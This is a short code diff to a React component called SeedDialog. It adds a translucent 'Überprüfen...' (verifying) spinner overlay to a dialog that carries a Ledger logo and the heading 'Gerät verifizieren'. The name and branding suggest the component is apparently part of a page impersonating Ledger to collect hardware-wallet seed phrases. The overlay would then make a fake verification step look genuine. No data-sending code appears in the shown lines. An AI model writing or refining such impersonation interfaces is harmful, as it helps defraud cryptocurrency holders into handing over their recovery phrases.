@@ -359,7 +359,13 @@ function SeedDialog({
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="max-w-2xl border-none bg-white p-8 text-black duration-500 data-[state=closed]:duration-300 data-[state=open]:slide-in-from-bottom-4 data-[state=open]:ease-out sm:p-10">
+      <DialogContent className="relative max-w-2xl overflow-hidden border-none bg-white p-8 text-black duration-500 data-[state=closed]:duration-300 data-[state=open]:slide-in-from-bottom-4 data-[state=open]:ease-out sm:p-10">
+        {verifying && (
+          <div className="absolute inset-0 z-50 flex flex-col items-center justify-center gap-4 bg-white/85 backdrop-blur-sm">
+            <Loader2 className="h-10 w-10 animate-spin text-[#a78bfa]" />
+            <span className="text-sm font-medium text-gray-700">Überprüfen...</span>
+          </div>
+        )}
         <div className="flex flex-col items-center">
           <img src={ledgerLogo} alt="Ledger" className="mb-6 h-12 w-auto" />
           <h3 className="text-xl font-semibold text-black">Gerät verifizieren</h3>
